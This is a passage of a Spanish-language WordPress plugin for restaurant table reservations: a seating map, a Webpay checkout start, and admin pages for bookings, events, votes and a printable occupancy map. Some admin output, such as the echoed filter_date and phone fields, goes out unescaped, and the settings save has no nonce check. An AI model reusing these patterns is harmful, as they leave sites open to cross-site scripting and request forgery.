                        this.st = { n:n, p:fullPhone, e:e, d:d, t:t, g:parseInt(g), evt:evt, evname:evname, s:[], sd:[], cap:0, salon: 'Evento' };
                        
                        const fd = new FormData(); fd.append('action','km_fetch_occupied'); fd.append('date',d);
                        
                        Swal.fire({title: 'Cargando mapa...', allowOutsideClick: false, didOpen:()=>{Swal.showLoading()}});
                        
                        fetch(KM_CFG.ajax, {method:'POST', body:fd})
                        .then(r => r.json())
                        .then(res => { 
                            Swal.close();
                            if(res && Array.isArray(res.occupied)) {
                                document.getElementById('km-step-1').classList.add('hidden'); 
                                document.getElementById('km-step-2').classList.remove('hidden'); 
                                this.recommend(res.occupied);
                                this.draw(res.occupied); 
                                this.upd(); 
                            } else {
                                Swal.fire({icon:'error', title:'Error de lectura', text:'El servidor no devolvió las mesas correctamente.', background:'#111', color:'#fff'});
                            }
                        })
                        .catch(err => {
                            // Si el servidor falla (ej. error 500 o de conexión), cae aquí y no se congela
                            Swal.close();
                            Swal.fire({icon:'error', title:'Error de Conexión', text:'Hubo un problema al contactar con el servidor. Intenta de nuevo.', background:'#111', color:'#fff'});
                            console.error('Error cargando el mapa:', err);
                        });
                    }
                },

                recommend: function(occ) {
                    this.rec = []; const g = this.st.g; const free = KM_CFG.tables.filter(t => !occ.includes(t.id.toString()));
                    if (g <= 3) this.rec = free.filter(t => t.c === 2).map(t => t.id);
                    else if (g <= 5) this.rec = free.filter(t => t.c === 4).map(t => t.id);
                    else this.rec = free.map(t => t.id); 
                    
                    let msg = "Las mesas azules son las ideales para tu grupo.";
                    if(g === 3) msg = "Te recomendamos una mesa azul (para 2) y añadiremos una silla extra.";
                    if(g === 5) msg = "Te recomendamos una mesa azul (para 4) y añadiremos una silla extra.";
                    
                    Swal.fire({icon: 'info', title: 'Optimización de Espacio', text: msg, background: '#111', color: '#fff', confirmButtonColor: '#3498db'});
                },

                draw: function(occ) {
                    const c = document.getElementById('km-tables-group'); c.innerHTML = '';
                    KM_CFG.tables.forEach(t => {
                        const isOcc = occ.includes(t.id.toString());
                        const isRec = this.rec.includes(t.id);
                        const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
                        g.setAttribute("class", `m-g ${isOcc?'occupied':''} ${isRec?'recommended':''}`); g.setAttribute("transform", `translate(${t.x},${t.y})`);
                        g.innerHTML = `<use href="#${t.t}"></use><text class="label-mesa" y="6">${t.id}</text>`;
                        if(!isOcc) g.onclick = () => this.tog(t, g);
                        c.appendChild(g);
                    });
                },

                tog: function(t, el) {
                    const idx = this.st.s.indexOf(t.id.toString());
                    if(idx > -1) { 
                        this.st.s.splice(idx,1); this.st.sd = this.st.sd.filter(x=>x.id!==t.id); this.st.cap -= this.getCap(t); el.classList.remove('selected'); 
                    } else { 
                        if (!this.rec.includes(t.id) && this.st.g < 6) return Swal.fire({icon:'warning', title:'Optimización', text:'Por favor selecciona una de las mesas azules asignadas.', background:'#111', color:'#fff'});
                        if(this.st.cap >= this.st.g) return Swal.fire({icon:'info', title:'Completo', text:'Suficientes puestos', background:'#111', color:'#fff'}); 
                        
                        // Lógica de adyacencia (Evitar que elijan mesas separadas)
                        if(this.st.s.length > 0) { 
                            const near = this.st.sd.some(ex => Math.sqrt(Math.pow(ex.x-t.x,2)+Math.pow(ex.y-t.y,2)) <= KM_CFG.max_dist); 
                            if(!near) return Swal.fire({icon:'warning', title:'Mesas separadas', text:'Elige mesas que estén juntas o cercanas.', background:'#111', color:'#fff'}); 
                        } 
                        
                        this.st.s.push(t.id.toString()); this.st.sd.push(t); this.st.cap += this.getCap(t); el.classList.add('selected'); 
                    }
                    this.upd();
                },

                getCap: function(t) { if (this.st.g === 3 && t.c === 2) return 3; if (this.st.g === 5 && t.c === 4) return 5; return t.c; },
                
                upd: function() { 
                    const ok = this.st.cap >= this.st.g; 
                    const btn = document.getElementById('km-confirm'); 
                    btn.disabled = !ok; 
                    btn.style.opacity = ok ? '1' : '0.5'; 
                    btn.style.cursor = ok ? 'pointer' : 'not-allowed'; 
                    document.getElementById('km-count').innerText = `${this.st.cap} / ${this.st.g}`; 
                    document.getElementById('km-status').innerText = ok ? '¡Listo!' : 'Faltan sillas'; 
                    document.getElementById('km-status').style.color = ok ? '#27ae60' : '#fff'; 
                },
                
                preConfirm: function() {
                    // CÁLCULO VISUAL ESTRICTO (Muestra al cliente solo el precio configurado * cantidad)
                    const total = this.st.g * KM_CFG.price_pp; 
                    const fmtTotal = total.toLocaleString('es-CL');
                    const fmtPrice = KM_CFG.price_pp.toLocaleString('es-CL');

                    let detailHtml = '';
                    if (this.st.evt === '1') {
                         detailHtml = `<p>Evento: <strong>${this.st.evname}</strong></p><p>Fecha: <strong>${this.st.d}</strong></p>`;
                    } else {
                         detailHtml = `
                            <p>Fecha: <strong>${this.st.d}</strong> | Hora: <strong>${this.st.t}</strong></p>
                            <p style="color:var(--km-blue); font-weight:bold;">Ubicación: ${this.st.salon}</p>
                         `;
                    }

                    Swal.fire({
                        title: 'CONFIRMAR RESERVA',
                        html: `
                            <div style="text-align:left; color:#ccc; margin-bottom:10px;">
                                <p style="font-size:1.2rem; color:#f39c12; text-align:center;">Total a pagar: <strong>$${fmtTotal} CLP</strong></p>
                                <p style="font-size:0.8rem; text-align:center;">($${fmtPrice} x ${this.st.g} personas)</p>
                                <hr style="border-color:#333;">
                                ${detailHtml}
                            </div>
                            <div class="swal-terms-container">
                                <label style="display:flex; align-items:flex-start; cursor:pointer; color:#fff;">
                                    <input type="checkbox" id="km-terms" style="margin-top:4px;">
                                    <span>${KM_CFG.popup_text}</span>
                                </label>
                            </div>
                        `,
                        background: '#111', color: '#fff', confirmButtonText: 'IR A PAGAR', confirmButtonColor: '#27ae60', showCancelButton: true, cancelButtonText: 'Cancelar', cancelButtonColor: '#c0392b',
                        preConfirm: () => { if (!document.getElementById('km-terms').checked) return Swal.showValidationMessage('Debes aceptar los términos.'); }
                    }).then((result) => { if (result.isConfirmed) this.processPayment(); });
                },
                
                processPayment: function() {
                    Swal.fire({title: 'Generando Pago...', text: 'Preparando entorno seguro para Webpay...', allowOutsideClick: false, didOpen:()=>{Swal.showLoading()}});
                    
                    const fd = new FormData(); 
                    fd.append('action','km_initiate_reservation'); 
                    fd.append('name',this.st.n); 
                    fd.append('phone',this.st.p); 
                    fd.append('email',this.st.e); 
                    fd.append('date',this.st.d); 
                    fd.append('time',this.st.t); 
                    fd.append('guests',this.st.g); 
                    fd.append('tables',JSON.stringify(this.st.s)); 
                    fd.append('is_event',this.st.evt);
                    fd.append('event_name',this.st.evname); 
                    fd.append('salon_type', this.st.salon);

                    fetch(KM_CFG.ajax, {method:'POST', body:fd})
                    .then(r=>r.json())
                    .then(res=>{ 
                        if(res.success && res.redirect) {
                            window.location.href = res.redirect; 
                        } else {
                            Swal.fire({icon:'error', title:'Error', text: res.message || 'No se pudo iniciar el pago', background:'#111', color:'#fff'}); 
                        }
                    })
                    .catch(err => {
                        Swal.fire({icon:'error', title:'Error de Conexión', text:'Hubo un problema al procesar el pago. Intenta de nuevo.', background:'#111', color:'#fff'});
                        console.error('Error de pago:', err);
                    }); 
                }
            };
            </script>
            <?php
        }
        // ==========================================
        // ADMIN: MENÚ Y CONFIGURACIÓN
        // ==========================================
        public function add_admin_menu() { 
            add_menu_page('Reservas', 'Reservas Elite', 'manage_options', 'km-reservas', [$this, 'render_admin_dashboard'], 'dashicons-calendar-alt', 6);
            add_submenu_page('km-reservas', 'Generador Links', 'Generador Links', 'manage_options', 'km-generador', [$this, 'render_admin_events']);
            add_submenu_page('km-reservas', 'Votos de Eventos', 'Votos', 'manage_options', 'km-votos', [$this, 'render_admin_votes']);
            add_submenu_page('km-reservas', 'Mapa Ocupación', 'Mapa Ocupación', 'manage_options', 'km-mapa', [$this, 'render_admin_map']);
            add_submenu_page('km-reservas', 'Configuración', 'Configuración', 'manage_options', 'km-settings', [$this, 'render_admin_settings']);
        }
        
        public function enqueue_admin_assets($hook) { 
            if (strpos($hook, 'km-') === false) return; 
            wp_enqueue_media();
            wp_enqueue_style('datatables-css', 'https://cdn.datatables.net/1.13.4/css/jquery.dataTables.min.css'); 
            wp_enqueue_script('datatables-js', 'https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js', ['jquery'], null, true); 
            wp_enqueue_script('sweetalert2-admin', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', [], null, true); 
            wp_enqueue_script('html2pdf', 'https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js', [], null, true); 
        }

        public function render_admin_settings() {
            if(isset($_POST['km_save_settings'])) {
                update_option('km_logo_url', sanitize_text_field($_POST['km_logo_url']));
                update_option('km_price_per_person', intval($_POST['km_price_per_person']));
                update_option('km_popup_text', sanitize_textarea_field($_POST['km_popup_text']));
                update_option('km_open_time', sanitize_text_field($_POST['km_open_time']));
                update_option('km_close_time', sanitize_text_field($_POST['km_close_time']));
                update_option('km_whatsapp_number', sanitize_text_field($_POST['km_whatsapp_number']));
                update_option('km_custom_product_id', intval($_POST['km_custom_product_id']));
                echo '<div class="notice notice-success"><p>Configuración guardada.</p></div>';
            }
            $logo = get_option('km_logo_url'); $price = get_option('km_price_per_person', 2000); $popup = get_option('km_popup_text');
            $open = get_option('km_open_time', '12:00'); $close = get_option('km_close_time', '21:00'); 
            $wa_number = get_option('km_whatsapp_number', ''); $custom_product_id = get_option('km_custom_product_id', '');
            ?>
            <div class="wrap km-wrap" style="padding:20px; background:#fff; margin-top:20px; border-radius:10px;">
                <h1 style="border-bottom:2px solid #c0392b; padding-bottom:15px;">Configuración Global</h1>
                <form method="post" action="">
                    <table class="form-table">
                        <tr><th scope="row">Precio por Persona (Default)</th><td><input type="number" name="km_price_per_person" value="<?php echo esc_attr($price); ?>" class="regular-text"> CLP</td></tr>
                        <tr><th scope="row" style="color:#c0392b;">ID Producto (WooCommerce)</th><td><input type="number" name="km_custom_product_id" value="<?php echo esc_attr($custom_product_id); ?>" class="regular-text" placeholder="Ej: 154"></td></tr>
                        <tr><th scope="row" style="color:#25D366;">Número de WhatsApp</th><td><input type="text" name="km_whatsapp_number" value="<?php echo esc_attr($wa_number); ?>" class="regular-text"></td></tr>
                        <tr><th scope="row">Horario Normal</th><td>Apertura: <input type="time" name="km_open_time" value="<?php echo esc_attr($open); ?>"> Cierre: <input type="time" name="km_close_time" value="<?php echo esc_attr($close); ?>"></td></tr>
                        <tr><th scope="row">Texto Pop-up (Términos)</th><td><textarea name="km_popup_text" rows="3" class="large-text"><?php echo esc_textarea($popup); ?></textarea></td></tr>
                        <tr><th scope="row">Logo URL</th><td><input type="text" name="km_logo_url" id="km_logo_url" value="<?php echo esc_attr($logo); ?>" class="regular-text"><button type="button" class="button" id="upload_logo_btn">Elegir</button></td></tr>
                    </table>
                    <p class="submit"><button type="submit" name="km_save_settings" class="button button-primary">Guardar Configuración</button></p>
                </form>
            </div>
            <script>jQuery('#upload_logo_btn').click(function(e){ e.preventDefault(); var i=wp.media({title:'Logo',multiple:false}).open().on('select',function(){ $('#km_logo_url').val(i.state().get('selection').first().toJSON().url); }); });</script>
            <?php
        }

        // ==========================================
        // ADMIN: DASHBOARD Y EDICIÓN INTELIGENTE
        // ==========================================
        public function render_admin_dashboard() {
            $filter_date = isset($_GET['filter_date']) ? $_GET['filter_date'] : date('Y-m-d');
            $reservations = $this->wpdb->get_results($this->wpdb->prepare("SELECT * FROM $this->table_name WHERE booking_date = %s AND status != 'cancelled' ORDER BY created_at DESC", $filter_date));
            ?>
            <div class="wrap km-wrap">
                <div class="km-toolbar" style="margin-bottom:15px; display:flex; justify-content:space-between; align-items:center;">
                    <h1 style="margin:0;">Gestión de Reservas</h1>
                    <form method="GET" action="admin.php" style="display:flex; align-items:center; gap:10px;">
                        <input type="hidden" name="page" value="km-reservas"><label>Ver día:</label>
                        <input type="date" name="filter_date" value="<?php echo $filter_date; ?>" style="padding:5px; border-radius:4px; border:1px solid #ccc;">
                        <button type="submit" class="button button-primary">Filtrar</button>
                    </form>
                </div>
                <div style="background:white; padding:20px; border-radius:10px;">
                    <table id="km-table" class="display" style="width:100%">
                        <thead><tr><th>ID</th><th>Cliente</th><th>Fecha/Hora</th><th>Salón/Evento</th><th>Mesas</th><th>Pax</th><th>Total</th><th>Estado</th><th>Acciones</th></tr></thead>
                        <tbody>
                            <?php foreach($reservations as $r): $tables = json_decode($r->tables_data); ?>
                            <tr>
                                <td>#<?php echo $r->reservation_code; ?></td>
                                <td><?php echo esc_html($r->client_name); ?><br><small><?php echo $r->phone; ?></small></td>
                                <td><?php echo $r->booking_date; ?> <br> <strong><?php echo $r->booking_time ? $r->booking_time : '-'; ?></strong></td>
                                <td style="font-weight:bold; color:#3498db;"><?php echo $r->is_event ? 'Evento: '.esc_html($r->event_name) : esc_html($r->salon_type); ?></td>
                                <td><?php if(is_array($tables)) foreach($tables as $t) echo "<span style='background:#c0392b; color:white; padding:2px 6px; border-radius:10px; font-size:11px; margin-right:3px;'>M$t</span>"; ?></td>
                                <td><?php echo $r->guests; ?></td>
                                <td style="font-weight:bold;">$<?php echo number_format($r->advance_payment, 0, ',', '.'); ?></td>
                                <td style="color: <?php echo $r->status=='confirmed'?'green':'orange'; ?>; font-weight: bold;"><?php echo ucfirst($r->status); ?></td>
                                <td><button class="button button-primary" onclick='adminApp.openEdit(<?php echo json_encode($r); ?>)'>Editar</button></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <div id="editModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; padding-top:50px;">
                <div style="background:white; width:700px; padding:25px; border-radius:12px; box-shadow: 0 5px 20px rgba(0,0,0,0.3);">
                    <h2 style="margin-top:0; border-bottom:2px solid #c0392b; padding-bottom:10px;">Editar Reserva</h2>
                    <input type="hidden" id="e_id">
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                        <label>Nombre<input type="text" id="e_name" class="widefat"></label>
                        <label>Teléfono<input type="text" id="e_phone" class="widefat"></label>
                        <label>Email<input type="email" id="e_email" class="widefat"></label>
                        <label>Fecha<input type="date" id="e_date" class="widefat" onchange="adminApp.fetchAvailableTables()"></label>
                        <label>Hora<input type="time" id="e_time" class="widefat"></label>
                        <label>Invitados<input type="number" id="e_guests" class="widefat"></label>
                        <label>Salón/Ubicación<select id="e_salon" class="widefat"><option value="">-- Sin Salón --</option><option value="Salón de Vinos">Salón de Vinos</option><option value="Salón de Velas">Salón de Velas</option><option value="Evento">Evento</option></select></label>
                        <label>Pago ($)<input type="number" id="e_payment" class="widefat"></label>
                        <label>Estado<select id="e_status" class="widefat"><option value="confirmed">Confirmada</option><option value="pending_payment">Pendiente</option><option value="cancelled">Cancelada</option></select></label>
                    </div>
                    
                    <div style="margin-top:20px; background:#f1f1f1; padding:15px; border-radius:8px;">
                        <h4 style="margin:0 0 10px 0;">Mesas Asignadas</h4>
                        <div id="current-tables-list" style="margin-bottom:10px;"></div>
                        <select id="add-table-select" class="widefat" onchange="adminApp.addTable(this.value)">
                            <option>Añadir mesa...</option>
                        </select>
                        <p style="font-size:11px; color:#666; margin-top:5px;">El sistema solo muestra mesas libres que estén <strong>cerca</strong> de las mesas ya seleccionadas.</p>
                    </div>
                    
                    <div style="text-align:right; margin-top:20px;">
                        <button class="button" onclick="adminApp.close()">Cerrar</button> 
                        <button class="button button-primary" onclick="adminApp.save()">Guardar Cambios</button>
                    </div>
                </div>
            </div>

            <script>
            jQuery(document).ready(function($) { $('#km-table').DataTable(); });
            const adminApp = {
                currentTables: [],
                openEdit: function(data) { 
                    try { this.currentTables = JSON.parse(data.tables_data).map(String); } catch(e) { this.currentTables = []; } 
                    document.getElementById('editModal').style.display = 'flex'; 
                    document.getElementById('e_id').value = data.id; document.getElementById('e_name').value = data.client_name; 
                    document.getElementById('e_phone').value = data.phone; document.getElementById('e_email').value = data.client_email || ''; 
                    document.getElementById('e_date').value = data.booking_date; document.getElementById('e_time').value = data.booking_time; 
                    document.getElementById('e_salon').value = data.salon_type || ''; document.getElementById('e_guests').value = data.guests; 
                    document.getElementById('e_status').value = data.status; document.getElementById('e_payment').value = data.advance_payment; 
                    this.renderTables(); this.fetchAvailableTables(); 
                },
                close: function() { document.getElementById('editModal').style.display = 'none'; },
                renderTables: function() { const c = document.getElementById('current-tables-list'); c.innerHTML = ''; this.currentTables.forEach(tId => { const s = document.createElement('span'); s.style.cssText = "background:#c0392b; color:white; padding:4px 10px; border-radius:15px; margin-right:5px; display:inline-block; font-weight:bold;"; s.innerHTML = `Mesa ${tId} <span style='cursor:pointer; margin-left:5px;' onclick="adminApp.removeTable('${tId}')">✖</span>`; c.appendChild(s); }); },
                removeTable: function(tId) { this.currentTables = this.currentTables.filter(id => id !== tId.toString()); this.renderTables(); this.fetchAvailableTables(); },
                addTable: function(tId) { if(!tId) return; if(!this.currentTables.includes(tId.toString())) { this.currentTables.push(tId.toString()); this.renderTables(); this.fetchAvailableTables(); document.getElementById('add-table-select').value = ""; } },
                fetchAvailableTables: function() { 
                    jQuery.post(ajaxurl, { action: 'km_get_adjacent_tables', date: document.getElementById('e_date').value, current_tables: this.currentTables, reservation_id: document.getElementById('e_id').value }, (res) => { 
                        const s = document.getElementById('add-table-select'); s.innerHTML = '<option value="">Selecciona una mesa disponible y cercana...</option>'; 
                        if(res.success && res.tables.length > 0) res.tables.forEach(t => { s.innerHTML += `<option value="${t.id}">Mesa ${t.id} (Cap: ${t.c})</option>`; }); 
                        else if(res.success && res.tables.length === 0) s.innerHTML = '<option value="">No hay mesas libres cerca.</option>';
                    }, 'json'); 
                },
                save: function() { 
                    const d = { action: 'km_admin_update_reservation', id: document.getElementById('e_id').value, name: document.getElementById('e_name').value, phone: document.getElementById('e_phone').value, email: document.getElementById('e_email').value, date: document.getElementById('e_date').value, time: document.getElementById('e_time').value, salon_type: document.getElementById('e_salon').value, guests: document.getElementById('e_guests').value, status: document.getElementById('e_status').value, payment: document.getElementById('e_payment').value, tables: JSON.stringify(this.currentTables) }; 
                    jQuery.post(ajaxurl, d, function(res) { if(res.success) location.reload(); }, 'json'); 
                }
            };
            </script>
            <?php
        }

        // ==========================================
        // ADMIN: GENERADOR DE LINKS (RESTAURADO)
        // ==========================================
        public function render_admin_events() {
            $events = $this->wpdb->get_results("SELECT * FROM $this->table_events ORDER BY created_at DESC");
            ?>
            <div class="wrap km-wrap" style="padding:20px; background:#fff; margin-top:20px; border-radius:10px;">
                <h1 style="border-bottom:2px solid #c0392b; padding-bottom:15px;">Generador y Editor de Links de Eventos</h1>
                <div style="background:#f9f9f9; padding:20px; border-radius:10px; border:1px solid #ddd; margin-bottom:30px;">
                    <h3>Crear Nuevo Evento</h3>
                    <div style="display:grid; grid-template-columns: 2fr 1fr 1fr 2fr auto; gap:15px; align-items:end;">
                        <div><label style="font-weight:bold;">Nombre Evento</label><input type="text" id="evt_name" class="widefat"></div>
                        <div><label style="font-weight:bold;">Fecha</label><input type="date" id="evt_date" class="widefat"></div>
                        <div><label style="font-weight:bold;">Precio/Pers ($)</label><input type="number" id="evt_price" class="widefat"></div>
                        <div><label style="font-weight:bold;">Términos</label><input type="text" id="evt_popup" class="widefat"></div>
                        <button class="button button-primary" onclick="evtManager.create()" style="height:30px;">Crear</button>
                    </div>
                </div>
                <table class="wp-list-table widefat fixed striped">
                    <thead><tr><th>ID</th><th>Evento</th><th>Fecha</th><th>Precio/Pax</th><th>Link de Reserva</th><th>Acciones</th></tr></thead>
                    <tbody>
                        <?php if(empty($events)): ?><tr><td colspan="6">No hay eventos creados.</td></tr><?php else: foreach($events as $ev): ?>
                        <tr>
                            <td><?php echo $ev->id; ?></td>
                            <td><strong><?php echo esc_html($ev->event_name); ?></strong></td>
                            <td><?php echo date('d/m/Y', strtotime($ev->event_date)); ?></td>
                            <td>$<?php echo number_format($ev->price_per_person,0,',','.'); ?></td>
                            <td><input type="text" value="<?php echo esc_attr($ev->generated_link); ?>" readonly style="width:100%;" onclick="this.select()"></td>
                            <td>
                                <button class="button" onclick='evtManager.openEdit(<?php echo json_encode($ev); ?>)'>Editar</button>
                                <button class="button" onclick="evtManager.delete(<?php echo $ev->id; ?>)" style="color:#a00;">Borrar</button>
                            </td>
                        </tr>
                        <?php endforeach; endif; ?>
                    </tbody>
                </table>
            </div>

            <div id="editEventModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center;">
                <div style="background:white; width:500px; padding:25px; border-radius:12px;">
                    <h2 style="margin-top:0;">Editar Evento</h2>
                    <input type="hidden" id="edit_evt_id">
                    <p><label>Nombre</label><input type="text" id="edit_evt_name" class="widefat"></p>
                    <p><label>Fecha</label><input type="date" id="edit_evt_date" class="widefat"></p>
                    <p><label>Precio / Persona ($)</label><input type="number" id="edit_evt_price" class="widefat"></p>
                    <p><label>Términos Pop-up</label><textarea id="edit_evt_popup" class="widefat" rows="3"></textarea></p>
                    <div style="text-align:right; margin-top:20px;">
                        <button class="button" onclick="evtManager.closeEdit()">Cancelar</button>
                        <button class="button button-primary" onclick="evtManager.saveEdit()">Guardar Cambios</button>
                    </div>
                </div>
            </div>

            <script>
            const evtManager = {
                create: function() {
                    const n = document.getElementById('evt_name').value, d = document.getElementById('evt_date').value, p = document.getElementById('evt_price').value, t = document.getElementById('evt_popup').value;
                    if(!n || !d) return alert('Completa nombre y fecha');
                    jQuery.post(ajaxurl, {action:'km_create_event_link', name:n, date:d, price:p, popup:t}, function(res){ if(res.success) location.reload(); });
                },
                delete: function(id) { if(confirm('¿Borrar este evento?')) jQuery.post(ajaxurl, {action:'km_delete_event', id:id}, function(res){ if(res.success) location.reload(); }); },
                openEdit: function(ev) {
                    document.getElementById('edit_evt_id').value = ev.id; document.getElementById('edit_evt_name').value = ev.event_name;
                    document.getElementById('edit_evt_date').value = ev.event_date; document.getElementById('edit_evt_price').value = ev.price_per_person;
                    document.getElementById('edit_evt_popup').value = ev.popup_text; document.getElementById('editEventModal').style.display = 'flex';
                },
                closeEdit: function() { document.getElementById('editEventModal').style.display = 'none'; },
                saveEdit: function() {
                    const d = { action: 'km_edit_event', id: document.getElementById('edit_evt_id').value, name: document.getElementById('edit_evt_name').value, date: document.getElementById('edit_evt_date').value, price: document.getElementById('edit_evt_price').value, popup: document.getElementById('edit_evt_popup').value };
                    jQuery.post(ajaxurl, d, function(res){ if(res.success) location.reload(); }, 'json');
                }
            };
            </script>
            <?php
        }

        // ==========================================
        // ADMIN: VOTOS Y MAPA IMPRIMIBLE
        // ==========================================
        public function render_admin_votes() {
            $votes = $this->wpdb->get_results("SELECT * FROM $this->table_votes ORDER BY created_at DESC");
            $stats = $this->wpdb->get_results("SELECT event_name, COUNT(*) as count FROM $this->table_votes GROUP BY event_name ORDER BY count DESC");
            ?>
            <div class="wrap km-wrap" style="padding:20px; background:#fff; margin-top:20px; border-radius:10px;">
                <h1 style="border-bottom:2px solid #c0392b; padding-bottom:15px;">Votos Recibidos</h1>
                <div style="display:flex; gap:20px; margin-bottom:20px; flex-wrap:wrap;">
                    <?php foreach($stats as $s): ?>
                        <div style="background:#f1f1f1; padding:15px 25px; border-radius:10px; border-left:4px solid #c0392b; flex:1; min-width:200px;">
                            <h3 style="margin:0;"><?php echo esc_html($s->event_name); ?></h3>
                            <p style="margin:5px 0 0 0; font-size:1.5rem; font-weight:bold; color:#c0392b;"><?php echo $s->count; ?> votos</p>
                        </div>
                    <?php endforeach; ?>
                </div>
                <table id="km-votes-table" class="display" style="width:100%">
                    <thead><tr><th>ID</th><th>Evento Votado</th><th>Nombre</th><th>Email</th><th>WhatsApp</th><th>Fecha Voto</th></tr></thead>
                    <tbody>
                        <?php foreach($votes as $v): ?>
                        <tr>
                            <td>#<?php echo $v->id; ?></td>
                            <td style="font-weight:bold; color:#f39c12;"><?php echo esc_html($v->event_name); ?></td>
                            <td><?php echo esc_html($v->voter_name); ?></td>
                            <td><?php echo esc_html($v->voter_email); ?></td>
                            <td><?php echo esc_html($v->voter_whatsapp); ?></td>
                            <td><?php echo date('d/m/Y H:i', strtotime($v->created_at)); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <script>jQuery(document).ready(function($) { $('#km-votes-table').DataTable(); });</script>
            <?php
        }

        public function render_admin_map() {
            $date = isset($_GET['map_date']) ? sanitize_text_field($_GET['map_date']) : date('Y-m-d');
            $bookings = $this->wpdb->get_results($this->wpdb->prepare("SELECT tables_data, client_name, is_event, event_name FROM $this->table_name WHERE booking_date = %s AND status != 'cancelled'", $date));
            $occupied_tables = []; $table_details = [];
            
            foreach($bookings as $b) {
                $t_arr = json_decode($b->tables_data, true);
                if(is_array($t_arr)) {
                    foreach($t_arr as $t) {
                        $occupied_tables[] = $t;
                        $table_details[$t] = $b->client_name . ($b->is_event ? " (" . $b->event_name . ")" : "");
                    }
                }
            }
            $occupied_tables = array_unique($occupied_tables);
            ?>
            <div class="wrap km-wrap">
                <h1 style="border-bottom:2px solid #c0392b; padding-bottom:15px; margin-bottom:20px;">Mapa de Ocupación (Imprimible)</h1>
                <div style="display:flex; justify-content:space-between; align-items:center; background:white; padding:15px; border-radius:10px; margin-bottom:20px;">
                    <form method="GET" action="admin.php" style="display:flex; align-items:center; gap:10px;">
                        <input type="hidden" name="page" value="km-mapa">
                        <label><strong>Seleccionar Fecha:</strong></label>
                        <input type="date" name="map_date" value="<?php echo $date; ?>" style="padding:5px; border-radius:4px; border:1px solid #ccc;">
                        <button type="submit" class="button button-primary">Cargar Mapa</button>
                    </form>
                    <button class="button" style="background:#27ae60; color:white; border-color:#27ae60;" onclick="exportPdfMap()">⬇️ Descargar PDF (Ahorro Tinta)</button>
                </div>

                <div id="print-map-area" style="background:#ffffff; border: 1px solid #ddd; border-radius:10px; padding:30px; max-width: 800px; margin: 0 auto;">
                    <h2 style="text-align:center; color:#000; margin-top:0;">Ocupación: <?php echo date('d/m/Y', strtotime($date)); ?></h2>
                    <p style="text-align:center; font-size:12px; color:#666;">Las mesas marcadas en rojo están ocupadas.</p>
                    
                    <div style="width:100%; height:750px; display:flex; justify-content:center;">
                        <svg viewBox="120 320 760 1050" style="width:100%; height:100%; max-height:800px;">
                            <style>
                                .w-light { stroke: #000000; stroke-width: 3; stroke-linecap: round; fill: none; opacity: 1; }
                                .mesa-light { fill: #ffffff; stroke: #333333; stroke-width: 2; }
                                .silla-light { fill: #eeeeee; stroke: #999999; }
                                .label-light { fill: #000000; font-weight: bold; font-size: 14px; text-anchor: middle; font-family: sans-serif; }
                                .m-occ .mesa-light { fill: #c0392b !important; stroke: #800000 !important; }
                                .m-occ .label-light { fill: #ffffff !important; }
                            </style>
                            <defs>
                                <g id="t2-l"><rect x="-17" y="-24" width="34" height="48" rx="4" class="mesa-light"/><rect x="-24" y="-14" width="7" height="28" rx="2" class="silla-light"/><rect x="17" y="-14" width="7" height="28" rx="2" class="silla-light"/></g>
                                <g id="t4-l"><rect x="-24" y="-24" width="48" height="48" rx="4" class="mesa-light"/><rect x="-14" y="-30" width="28" height="7" rx="2" class="silla-light"/><rect x="-14" y="24" width="28" height="7" rx="2" class="silla-light"/><rect x="-30" y="-14" width="7" height="28" rx="2" class="silla-light"/><rect x="24" y="-14" width="7" height="28" rx="2" class="silla-light"/></g>
                            </defs>
                            <g id="walls-light">
                                <path d="M149 350 L486 349 M147 349 L146 1098 M145 1102 L497 1100 M497 1099 L652 1332" class="w-light"/>
                                <path d="M485 349 L578 476 M737 380 L579 477 M823 505 L736 380 M676 606 L824 505" class="w-light"/>
                                <path d="M753 720 L676 606 M753 923 L753 720 M792 925 L752 923 M796 1229 L794 927" class="w-light"/>
                                <path d="M690 740 L692 1233 M796 1229 L693 1232 M693 925 L750 922 M745 1330 L744 1233" class="w-light"/>
                                <path d="M652 1334 L745 1331 M419 352 L692 741 M298 352 L298 980 M255 977 L257 353" class="w-light"/>
                                <path d="M301 637 L617 639 M675 605 L579 476 M736 780 L773 778" class="w-light"/>
                            </g>
                            <g id="escenario-light">
                                <rect x="696" y="930" width="94" height="295" rx="15" fill="#ffffff" stroke="#000000" stroke-width="2"/>
                                <text x="743" y="1077" transform="rotate(90, 743, 1077)" fill="#000000" font-size="34" font-weight="800" font-family="sans-serif" letter-spacing="2" text-anchor="middle">Escenario</text>
                            </g>
                            <?php foreach($this->tables_config as $t): 
                                $is_occ = in_array((string)$t['id'], $occupied_tables);
                                $class = $is_occ ? "m-occ" : "";
                                $title = $is_occ ? esc_attr($table_details[(string)$t['id']]) : "Libre";
                            ?>
                                <g class="<?php echo $class; ?>" transform="translate(<?php echo $t['x']; ?>,<?php echo $t['y']; ?>)">
                                    <title>Mesa <?php echo $t['id']; ?> - <?php echo $title; ?></title>
                                    <use href="#<?php echo $t['t']; ?>-l"></use>
                                    <text class="label-light" y="5"><?php echo $t['id']; ?></text>
                                </g>
                            <?php endforeach; ?>
                        </svg>
                    </div>
                </div>
            </div>
            <script>
            function exportPdfMap() {
                const element = document.getElementById('print-map-area');
                html2pdf().set({ margin: 10, filename: 'mapa-ocupacion-<?php echo $date; ?>.pdf', image: { type: 'jpeg', quality: 0.98 }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' } }).from(element).save();
            }
            </script>
            <?php
        }

        // ==========================================
        // LÓGICA DE SERVIDOR Y AJAX 
        // ==========================================
        public function ajax_submit_vote() {
            $name = sanitize_text_field($_POST['name']); $email = sanitize_email($_POST['email']);
            $wa = sanitize_text_field($_POST['wa']); $ev = sanitize_text_field($_POST['event']);
